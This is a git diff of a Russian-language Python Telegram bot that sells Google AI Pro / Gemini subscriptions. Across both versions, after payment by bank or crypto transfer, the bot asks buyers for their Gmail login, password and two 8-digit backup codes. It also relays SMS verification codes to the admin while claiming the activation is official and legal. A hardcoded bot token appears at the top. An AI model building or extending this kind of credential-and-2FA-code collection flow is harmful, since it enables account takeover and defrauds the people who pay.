@@ -1,28 +1,26 @@
 import telebot
 from telebot import types
 
-# --- НАСТРОЙКИ БОТА ---
+# --- ⚙️ НАСТРОЙКИ БОТА ---
 TOKEN = '8748113253:AAHp05rxnNdHGVFAvCcTU0hc7Yks0UUzSPk'
 ADMIN_ID = 6305773261  # Твой личный ID
 
-# СЮДА ВСТАВЬ СВОИ ДВЕ ССЫЛКИ ОТ BOOSTY:
-PAYMENT_LINK_4000 = 'https://boosty.to/.../4000' 
-PAYMENT_LINK_3500 = 'https://boosty.to/.../3500'
+SUPPORT_LINK = 'https://t.me/ТВОЙ_ЛОГИН'  # Ссылка на твой аккаунт поддержки
 
-VIDEO_FILE_ID = 'СЮДА_ВСТАВЬ_КОД_ВИДЕО_ЕСЛИ_ЕСТЬ'
+# ID Видео (вставь сюда file_id твоих загруженных видео в Телеграм)
+VIDEO_ABOUT = 'СЮДА_ID_ВИДЕО_О_ПОДПИСКЕ'
+VIDEO_CODES = 'СЮДА_ID_ВИДЕО_КАК_НАЙТИ_КОДЫ'
 
 bot = telebot.TeleBot(TOKEN)
-
-# Словарь для хранения данных пользователей
 user_data = {}
 
-# --- КЛАВИАТУРЫ ---
+# --- 🎛 КЛАВИАТУРЫ ---
 def main_keyboard():
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
         types.InlineKeyboardButton("🛒 Купить подписку", callback_data="buy_menu"),
-        types.InlineKeyboardButton("🎁 Ввести промокод", callback_data="promo_code"),
-        types.InlineKeyboardButton("ℹ️ О подписке", callback_data="about_sub")
+        types.InlineKeyboardButton("ℹ️ О подписке", callback_data="about_sub"),
+        types.InlineKeyboardButton("📜 Правила и Поддержка", callback_data="rules_support")
     )
     return markup
 
@@ -31,238 +29,244 @@ def back_keyboard(callback_data="start"):
     markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data=callback_data))
     return markup
 
-def payment_keyboard():
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        types.InlineKeyboardButton("📖 Инструкция и Правила", callback_data="rules"),
-        types.InlineKeyboardButton("💳 Оплатить", callback_data="pay"),
-        types.InlineKeyboardButton("🔙 Назад", callback_data="start")
-    )
-    return markup
-
-# --- ГЛАВНОЕ МЕНЮ ---
+# --- 🚀 1. ГЛАВНОЕ МЕНЮ ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.clear_step_handler_by_chat_id(message.chat.id)
-    user_data[message.chat.id] = {'price': 4000, 'state': 'start'}
-    text = (
-        "Привет! 👋 Добро пожаловать в сервис безопасной активации премиум-подписки *Google Gemini 3.1 Pro*.\n\n"
-        "🛡️ *Ваша безопасность — наш приоритет.* Мы используем только официальные партнерские каналы Google. "
-        "Все подключения происходят легально, ваши личные данные под надежной защитой. Никаких рисков блокировки.\n\n"
-        "Выберите нужное действие в меню ниже 👇"
-    )
-    bot.send_message(message.chat.id, text, parse_mode='Markdown', reply_markup=main_keyboard())
-
-# --- ОБРАБОТКА ПРОМОКОДА ---
-def check_promo(message):
-    if message.text.strip().upper() == "VITALIY":
-        user_data[message.chat.id]['price'] = 3500
-        text = (
-            "✅ Промокод успешно применен!\n"
-            "Ваша цена со скидкой: *3 500 ₽*.\n\n"
-            "⚠️ *СЛЕДИТЕ ЗА ИНСТРУКЦИЯМИ, ЭТО ОЧЕНЬ ВАЖНО!*\n"
-            "Перед тем как нажать «Оплатить», обязательно ознакомьтесь с правилами нашего сервиса."
-        )
-        bot.send_message(message.chat.id, text, parse_mode='Markdown', reply_markup=payment_keyboard())
-    else:
-        bot.send_message(message.chat.id, "❌ Неверный промокод.", reply_markup=back_keyboard("start"))
-
-# --- ОБРАБОТКА ЧЕКОВ ---
-def handle_receipt(message):
     chat_id = message.chat.id
-    if message.photo or message.document:
-        bot.send_message(chat_id, "⏳ Чек отправлен администратору на проверку. Ожидайте подтверждения (обычно 1-5 минут).")
-        
-        # Кнопки для Админа
-        markup = types.InlineKeyboardMarkup(row_width=1)
-        markup.add(
-            types.InlineKeyboardButton("✅ Подтвердить оплату", callback_data=f"confirm_pay_{chat_id}"),
-            types.InlineKeyboardButton("❌ Отклонить (Фейк/Нет денег)", callback_data=f"reject_pay_{chat_id}")
-        )
-        
-        if message.photo:
-            bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=f"💰 НОВАЯ ОПЛАТА от ID: {chat_id}", reply_markup=markup)
-        elif message.document:
-            bot.send_document(ADMIN_ID, message.document.file_id, caption=f"💰 НОВАЯ ОПЛАТА от ID: {chat_id}", reply_markup=markup)
-    else:
-        bot.send_message(chat_id, "Пожалуйста, отправьте именно фото или PDF файл чека.")
-        bot.register_next_step_handler(message, handle_receipt)
-
-# --- ОБРАБОТКА ДАННЫХ ОТ КЛИЕНТА ---
-def receive_old_acc_data(message):
-    if message.text:
-        bot.send_message(message.chat.id, "✅ Данные приняты! Начинаем активацию, ожидайте.")
-        bot.send_message(ADMIN_ID, f"👤 ДАННЫЕ ОТ КЛИЕНТА (Существующий аккаунт):\n\n{message.text}")
-
-def receive_new_acc_phone(message):
-    client_id = message.chat.id
-    phone = message.text
-    bot.send_message(client_id, "✅ Принято! Активация займет 5-15 минут. Ожидайте, мы сообщим, когда придет СМС.")
+    bot.clear_step_handler_by_chat_id(chat_id)
+    user_data[chat_id] = {'price': 4000, 'promo_applied': False}
     
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        types.InlineKeyboardButton("📩 СМС придет", callback_data=f"smsyes_{client_id}"),
-        types.InlineKeyboardButton("❌ СМС НЕ придет", callback_data=f"smsno_{client_id}")
+    text = (
+        "Добро пожаловать! Ваша безопасность — это наш приоритет 🛡️\n\n"
+        "Этот бот — твой прямой доступ к официальной премиум-подписке **Google AI Pro (Gemini Pro + 2 ТБ хранилища)**.\n\n"
+        "Самая мощная нейросеть от Google, которая решает сложные задачи, пишет код и генерирует контент на профессиональном уровне.\n\n"
+        "Выбери нужный раздел ниже 👇"
     )
-    bot.send_message(ADMIN_ID, f"🆕 НОВЫЙ АККАУНТ.\nКлиент прислал номер: {phone}\nЧто делаем с СМС?", reply_markup=markup)
+    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=main_keyboard())
 
-def send_credentials_to_client(message, client_id):
-    bot.send_message(client_id, "🎉 Ваш новый аккаунт с премиум-подпиской готов!")
-    bot.copy_message(client_id, ADMIN_ID, message.message_id)
-    bot.send_message(ADMIN_ID, "✅ Данные успешно отправлены клиенту!")
-
-# --- ВЫЗОВ ВЫБОРА АККАУНТА ---
-def ask_account_type(chat_id, edit_msg=None):
-    text = "🎉 Оплата успешно подтверждена!\n\nТеперь давайте активируем вашу подписку. На какой аккаунт будем ее делать?"
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        types.InlineKeyboardButton("👤 На мой существующий аккаунт", callback_data="type_old"),
-        types.InlineKeyboardButton("🆕 Создать новый аккаунт", callback_data="type_new")
-    )
-    if edit_msg:
-        bot.edit_message_text(text, chat_id, edit_msg.message_id, reply_markup=markup)
-    else:
-        bot.send_message(chat_id, text, reply_markup=markup)
-
-# --- ЕДИНЫЙ РОУТЕР КНОПОК ---
+# --- 🔄 ОБРАБОТКА ВСЕХ КНОПОК ---
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     chat_id = call.message.chat.id
-    bot.clear_step_handler_by_chat_id(chat_id)
+    bot.clear_step_handler_by_chat_id(chat_id) # Очищаем ожидания текста, если нажали кнопку
 
     if chat_id not in user_data:
-        user_data[chat_id] = {'price': 4000, 'state': 'start'}
+        user_data[chat_id] = {'price': 4000, 'promo_applied': False}
 
+    # Возврат в старт
     if call.data == "start":
         bot.delete_message(chat_id, call.message.message_id)
         send_welcome(call.message)
 
+    # ℹ️ О подписке
     elif call.data == "about_sub":
-        bot.delete_message(chat_id, call.message.message_id)
         text = (
-            "*В чем разница между Бесплатной версией и Gemini 3.1 Pro?*\n\n"
-            "👑 *С подпиской Gemini 3.1 Pro:*\n"
-            "✅ *Gemini Advanced (3.1 Pro):* Самая умная нейросеть.\n"
-            "🎬 *Veo 3.1:* Топовый генератор видео по тексту.\n"
-            "🎨 *Nano Banana 2 (с доступом к Pro):* Создание шедевров из фото.\n"
-            "☁️ *Google One на 2 ТЕРАБАЙТА:* Огромное облако навсегда!\n\n"
-            "⏳ Срок действия: 12 месяцев."
+            "**Google AI Pro** открывает доступ к передовым технологиям на 12 месяцев:\n\n"
+            "🧠 **Gemini Advanced:** Топовая модель для сложных задач.\n"
+            "🎥 **Veo:** Профессиональная генерация видео.\n"
+            "🎨 **Nano Banana 2:** Создание и редактирование шедевральных изображений.\n"
+            "☁️ **Google One (2 ТБ):** Огромное защищенное облако для ваших данных."
         )
-        bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=back_keyboard("start"))
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            types.InlineKeyboardButton("🎬 Смотреть видео-обзор", callback_data="send_video_about"),
+            types.InlineKeyboardButton("🔙 Назад", callback_data="start")
+        )
+        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
 
-    elif call.data == "promo_code":
-        bot.edit_message_text("Отправьте ваш промокод в чат:", chat_id, call.message.message_id, reply_markup=back_keyboard("start"))
-        bot.register_next_step_handler(call.message, check_promo)
+    elif call.data == "send_video_about":
+        try:
+            bot.send_video(chat_id, VIDEO_ABOUT, caption="Краткий обзор возможностей Google AI Pro.")
+        except:
+            bot.send_message(chat_id, "Видео скоро будет загружено!")
 
+    # 📜 Правила и Поддержка
+    elif call.data == "rules_support":
+        text = (
+            "⚠️ **ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ ПЕРЕД ПОКУПКОЙ:**\n\n"
+            "1. **Гарантия:** Мы гарантируем официальную активацию подписки.\n"
+            "2. **Личные данные:** Если вы выбираете активацию на СВОЙ аккаунт, вы ОБЯЗАНЫ предоставить 100% верный пароль и резервные коды.\n"
+            "3. 🚫 **ШТРАФ:** Если вы скинули неверные данные, мы не смогли войти, а вы пропали — оплата НЕ ВОЗВРАЩАЕТСЯ. Цените свое и наше время.\n"
+            "4. Боитесь давать данные? Выбирайте опцию «Новый аккаунт» после оплаты.\n\n"
+            "Остались вопросы? Пишите в поддержку."
+        )
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            types.InlineKeyboardButton("👨‍💻 Написать в поддержку", url=SUPPORT_LINK),
+            types.InlineKeyboardButton("🔙 Назад", callback_data="start")
+        )
+        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', disable_web_page_preview=True, reply_markup=markup)
+
+    # 🛒 Меню покупки
     elif call.data == "buy_menu":
         price = user_data[chat_id]['price']
-        text = (
-            f"Вы перешли к покупке подписки Google Gemini 3.1 Pro.\n💰 К оплате: *{price} ₽*.\n\n"
-            "⚠️ *СЛЕДИТЕ ЗА ИНСТРУКЦИЯМИ, ЭТО ОЧЕНЬ ВАЖНО!*\n"
-            "Перед тем как нажать «Оплатить», обязательно ознакомьтесь с правилами нашего сервиса."
-        )
-        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=payment_keyboard())
-
-    elif call.data == "rules":
-        text = (
-            "*Как будет проходить процесс:*\n"
-            "1. Вы нажимаете «Оплатить» и отправляете чек в этот чат.\n"
-            "2. Администратор проверяет оплату (1-10 минут).\n"
-            "3. Бот предложит выбор: Существующий аккаунт или Новый.\n"
-            "4. Активация займет 5–7 минут.\n\n"
-            "🚫 *ПРАВИЛА (ВАЖНО!):*\n"
-            "• Для активации на существующий аккаунт потребуются Резервные коды Google.\n"
-            "• В случае умышленного предоставления неверных данных заявка аннулируется без возврата средств."
-        )
-        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=back_keyboard("buy_menu"))
-
-    elif call.data == "pay":
-        price = user_data[chat_id]['price']
-        # Выбор ссылки в зависимости от промокода
-        link = PAYMENT_LINK_3500 if price == 3500 else PAYMENT_LINK_4000
+        text = f"💳 **Оформление подписки Google AI Pro.**\n\nК оплате: **{price} руб.**\n"
         
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(types.InlineKeyboardButton(f"✅ Оплатить {price} руб.", callback_data="pay_step"))
+        if not user_data[chat_id]['promo_applied']:
+            markup.add(types.InlineKeyboardButton("🎁 Ввести промокод", callback_data="ask_promo"))
+        markup.add(types.InlineKeyboardButton("📜 Правила и Инструкции", callback_data="rules_support"))
+        markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data="start"))
+        
+        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+    # 🎁 Промокод
+    elif call.data == "ask_promo":
+        bot.edit_message_text("Напишите ваш промокод прямо в этот чат 👇", chat_id, call.message.message_id, reply_markup=back_keyboard("buy_menu"))
+        bot.register_next_step_handler(call.message, process_promo)
+
+    # 💳 Оплата (Реквизиты)
+    elif call.data == "pay_step":
+        price = user_data[chat_id]['price']
         text = (
-            f"Для оплаты перейдите по официальной ссылке:\n🔗 {link}\n\n"
-            "🧾 *После оплаты:* Обязательно отправьте скриншот чека или PDF прямо в этот чат!"
+            f"Для оплаты переведите **{price} руб.** по следующим реквизитам:\n\n"
+            "🏦 **Kaspi Bank:** +7-7XX-XXX-XX-XX (Имя)\n"
+            "🪙 **CryptoBot (USDT):** [Ссылка на чек]\n\n"
+            "🧾 **ОБЯЗАТЕЛЬНО:** После перевода отправьте фотографию чека или скриншот об оплате прямо в этот чат!"
         )
         bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=back_keyboard("buy_menu"))
         bot.register_next_step_handler(call.message, handle_receipt)
 
-    # --- КНОПКИ ДЛЯ АДМИНА (ПРОВЕРКА ЧЕКА) ---
+    # --- 👨‍⚖️ КНОПКИ АДМИНА (ПРОВЕРКА ЧЕКА) ---
     elif call.data.startswith("confirm_pay_"):
         client_id = int(call.data.split("_")[2])
-        bot.edit_message_text("✅ Ты подтвердил оплату!", chat_id, call.message.message_id)
+        bot.edit_message_text("✅ Чек подтвержден. Клиент выбирает тип аккаунта.", chat_id, call.message.message_id)
         ask_account_type(client_id)
 
     elif call.data.startswith("reject_pay_"):
         client_id = int(call.data.split("_")[2])
-        bot.edit_message_text("❌ Ты отклонил чек.", chat_id, call.message.message_id)
-        bot.send_message(client_id, "❌ Оплата не найдена. Если произошла ошибка, свяжитесь с поддержкой.")
+        msg = bot.send_message(chat_id, "❌ Чек отклонен. Напиши причину для клиента (например: 'Деньги не поступили'):")
+        bot.register_next_step_handler(msg, send_reject_reason, client_id)
 
-    # --- ВЫБОР ТИПА АККАУНТА ---
-    elif call.data == "back_to_acc_type":
-        ask_account_type(chat_id, edit_msg=call.message)
-
+    # --- 🔐 ВЫБОР ТИПА АККАУНТА (БЕЗ КНОПКИ НАЗАД) ---
     elif call.data == "type_old":
         text = (
-            "Отлично! Вы выбрали активацию на собственный аккаунт.\n\n"
-            "🛡 *Безопасность:* Для активации нам потребуется разовый вход. Вы можете предоставить запасной аккаунт.\n\n"
-            "Напишите нам ОДНИМ сообщением:\n1. Логин (Gmail)\n2. Пароль\n3. Два 8-значных резервных кода\n\n"
-            "Если вы не поняли, что это за коды, нажмите на кнопку «Инструкция»."
+            "Вы выбрали активацию на **Собственный аккаунт**.\n\n"
+            "Отправьте нам одним сообщением:\n"
+            "1. Адрес эл. почты (Логин)\n"
+            "2. Пароль\n"
+            "3. Два 8-значных резервных кода\n\n"
+            f"В случае проблем пишите: {SUPPORT_LINK}"
         )
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("📖 Инструкция по кодам", callback_data="instruction"))
-        markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data="back_to_acc_type"))
-        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
-        bot.register_next_step_handler(call.message, receive_old_acc_data)
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(types.InlineKeyboardButton("🎥 Как найти резервные коды", callback_data="send_video_codes"))
+        markup.add(types.InlineKeyboardButton("🔙 Изменить тип аккаунта", callback_data="back_to_acc_type"))
+        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', disable_web_page_preview=True, reply_markup=markup)
+        bot.register_next_step_handler(call.message, receive_client_data, "Собственный")
 
     elif call.data == "type_new":
         text = (
-            "Супер! Мы создадим для вас чистый аккаунт.\n"
-            "Для безопасности он будет привязан к вашему номеру.\n\n"
-            "📱 *Отправьте нам четкий, рабочий номер телефона:*\n"
-            "⚠️ Будьте на связи, скоро запросим код из СМС!"
+            "Вы выбрали **Создание нового аккаунта**.\n\n"
+            "Мы не требуем резервных кодов. Для создания вашего защищенного профиля отправьте:\n"
+            "1. Ваш личный номер телефона\n"
+            "2. Любой ваш резервный адрес эл. почты (для привязки безопасности)"
         )
-        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=back_keyboard("back_to_acc_type"))
-        bot.register_next_step_handler(call.message, receive_new_acc_phone)
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("🔙 Изменить тип аккаунта", callback_data="back_to_acc_type"))
+        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
+        bot.register_next_step_handler(call.message, receive_client_data, "Новый")
 
-    elif call.data == "instruction":
-        bot.send_message(chat_id, "Загружаю видеоинструкцию...")
+    elif call.data == "back_to_acc_type":
+        ask_account_type(chat_id, edit_msg=call.message)
+
+    elif call.data == "send_video_codes":
         try:
-            bot.send_video(chat_id, VIDEO_FILE_ID, caption="Как получить резервные коды.\nПосле просмотра отправьте ваши данные сюда.")
+            bot.send_video(chat_id, VIDEO_CODES, caption="Инструкция: где найти резервные коды.\nПосле просмотра отправьте ваши данные.")
         except:
-            bot.send_message(chat_id, "Видео скоро будет добавлено. Пока найдите в настройках безопасности Google 'Резервные коды'.")
-        bot.register_next_step_handler(call.message, receive_old_acc_data)
+            bot.send_message(chat_id, "Видео загружается. Найдите 'Резервные коды' в разделе 'Безопасность' вашего Google аккаунта.")
+        bot.register_next_step_handler(call.message, receive_client_data, "Собственный")
 
-    # --- КНОПКИ АДМИНА ПРО СМС ---
+    # --- 📲 КНОПКИ АДМИНА ПРО СМС ---
     elif call.data.startswith("smsyes_"):
         client_id = int(call.data.split("_")[1])
-        bot.send_message(client_id, "⚠️ *Внимание! Сейчас на ваш номер поступит СМС от Google. Напишите код из СМС прямо сюда!*", parse_mode='Markdown')
-        bot.edit_message_text("✅ Ты выбрал: СМС придет. Ждем код от клиента.", chat_id, call.message.message_id)
-        user_data[client_id] = {'state': 'waiting_for_sms_code'}
+        bot.send_message(client_id, "⚠️ **Внимание!** Сейчас на ваш номер придет СМС с кодом от Google. Напишите код прямо в этот чат!", parse_mode='Markdown')
+        bot.send_message(chat_id, f"✅ Ты запросил СМС у клиента {client_id}. Ждем...")
+        bot.register_next_step_handler(call.message, forward_sms_to_admin, ADMIN_ID) # Ожидание СМС от клиента перехватывается в общем хендлере
 
     elif call.data.startswith("smsno_"):
         client_id = int(call.data.split("_")[1])
-        msg = bot.send_message(chat_id, "❌ СМС НЕ придет. Отправь сюда логин и пароль, который нужно выдать клиенту.")
-        bot.register_next_step_handler(msg, send_credentials_to_client, client_id)
+        bot.send_message(client_id, "ℹ️ СМС на ваш номер не потребуется. Процесс идет, ваш заказ будет готов в течение 10-15 минут. Ожидайте!")
+        bot.send_message(chat_id, "✅ Ты выбрал 'СМС не придет'. Клиент успокоен.")
 
-# --- ПЕРЕХВАТ ТЕКСТА (СМС КОДЫ И ОБЩЕНИЕ С АДМИНОМ) ---
-@bot.message_handler(content_types=['text'])
-def handle_text(message):
+    # --- 🏁 ФИНАЛЬНАЯ ВЫДАЧА АККАУНТА АДМИНОМ ---
+    elif call.data.startswith("finish_acc_"):
+        client_id = int(call.data.split("_")[2])
+        msg = bot.send_message(chat_id, "📝 Отправь мне логин и пароль, которые нужно выдать клиенту:")
+        bot.register_next_step_handler(msg, send_final_account, client_id)
+
+# --- ФУНКЦИИ ЛОГИКИ ---
+def process_promo(message):
     chat_id = message.chat.id
-    # Если клиент ждет СМС
-    if chat_id in user_data and user_data[chat_id].get('state') == 'waiting_for_sms_code':
-        bot.send_message(ADMIN_ID, f"📩 Код СМС от клиента {chat_id}:\n{message.text}")
-        bot.send_message(chat_id, "Код принят, завершаем активацию...")
-        user_data[chat_id]['state'] = 'start' # Сброс состояния
-    # Если просто пишут в чат (пересылаем админу)
-    elif chat_id != ADMIN_ID:
-        bot.send_message(ADMIN_ID, f"💬 Сообщение от клиента {chat_id}:\n{message.text}")
+    if message.text.strip().upper() == "VITALIY":
+        user_data[chat_id]['price'] = 3500
+        user_data[chat_id]['promo_applied'] = True
+        bot.send_message(chat_id, "🎉 Промокод принят! Цена снижена.", reply_markup=back_keyboard("buy_menu"))
+    else:
+        bot.send_message(chat_id, "❌ Промокод не найден.", reply_markup=back_keyboard("buy_menu"))
 
-# --- ЗАПУСК БОТА ---
+def handle_receipt(message):
+    chat_id = message.chat.id
+    if message.photo or message.document:
+        bot.send_message(chat_id, "⏳ Чек отправлен на проверку. Ожидайте (обычно 1-5 минут).")
+        
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            types.InlineKeyboardButton("✅ Подтвердить оплату", callback_data=f"confirm_pay_{chat_id}"),
+            types.InlineKeyboardButton("❌ Отклонить чек", callback_data=f"reject_pay_{chat_id}")
+        )
+        if message.photo:
+            bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=f"💰 ЧЕК ОТ КЛИЕНТА: {chat_id}", reply_markup=markup)
+        else:
+            bot.send_document(ADMIN_ID, message.document.file_id, caption=f"💰 ЧЕК ОТ КЛИЕНТА: {chat_id}", reply_markup=markup)
+    else:
+        bot.send_message(chat_id, "Пожалуйста, отправьте картинку или PDF чека.")
+        bot.register_next_step_handler(message, handle_receipt)
+
+def send_reject_reason(message, client_id):
+    bot.send_message(client_id, f"❌ Ошибка проверки оплаты.\nПричина: {message.text}\n\nПожалуйста, проверьте перевод и попробуйте снова, или напишите в поддержку.")
+    bot.send_message(ADMIN_ID, "Сообщение об отказе отправлено клиенту.")
+
+def ask_account_type(chat_id, edit_msg=None):
+    text = (
+        "🎉 Оплата успешно подтверждена! Заказ взят в работу.\n\n"
+        "⚠️ **ВНИМАНИЕ: Не закрывайте это окно и сразу выберите тип подписки, чтобы мы начали активацию!**"
+    )
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        types.InlineKeyboardButton("👤 На собственный аккаунт", callback_data="type_old"),
+        types.InlineKeyboardButton("🆕 Создать новый аккаунт", callback_data="type_new")
+    )
+    if edit_msg:
+        bot.edit_message_text(text, chat_id, edit_msg.message_id, parse_mode='Markdown', reply_markup=markup)
+    else:
+        bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
+
+def receive_client_data(message, acc_type):
+    client_id = message.chat.id
+    bot.send_message(client_id, "✅ Данные получены! Идет активация подписки. Ожидайте дальнейших инструкций.")
+    
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    if acc_type == "Новый":
+        markup.add(
+            types.InlineKeyboardButton("📲 СМС придет", callback_data=f"smsyes_{client_id}"),
+            types.InlineKeyboardButton("🔇 СМС НЕ придет", callback_data=f"smsno_{client_id}")
+        )
+    markup.add(types.InlineKeyboardButton("🏁 ВЫДАТЬ ГОТОВЫЙ АККАУНТ", callback_data=f"finish_acc_{client_id}"))
+
+    bot.send_message(ADMIN_ID, f"🔥 НОВЫЙ ЗАКАЗ!\nТип: {acc_type}\nКлиент ID: {client_id}\n\nДанные:\n{message.text}", reply_markup=markup)
+
+def forward_sms_to_admin(message, admin_id):
+    bot.send_message(admin_id, f"📩 СМС код от клиента {message.chat.id}:\n{message.text}")
+    bot.send_message(message.chat.id, "Код принят, активируем...")
+
+def send_final_account(message, client_id):
+    bot.send_message(client_id, f"🎉 **Ваша подписка успешно активирована!**\n\nВаши данные для входа:\n{message.text}\n\nСпасибо, что выбрали нас!", parse_mode='Markdown')
+    bot.send_message(ADMIN_ID, "✅ Аккаунт успешно выдан клиенту!")
+
+# --- 🚀 ЗАПУСК БОТА ---
 print("Бот успешно запущен! Ожидание сообщений...")
 try:
     bot.infinity_polling(timeout=90, long_polling_timeout=50)
 except Exception as e:
-
     print(f"Ошибка интернета: {e}")
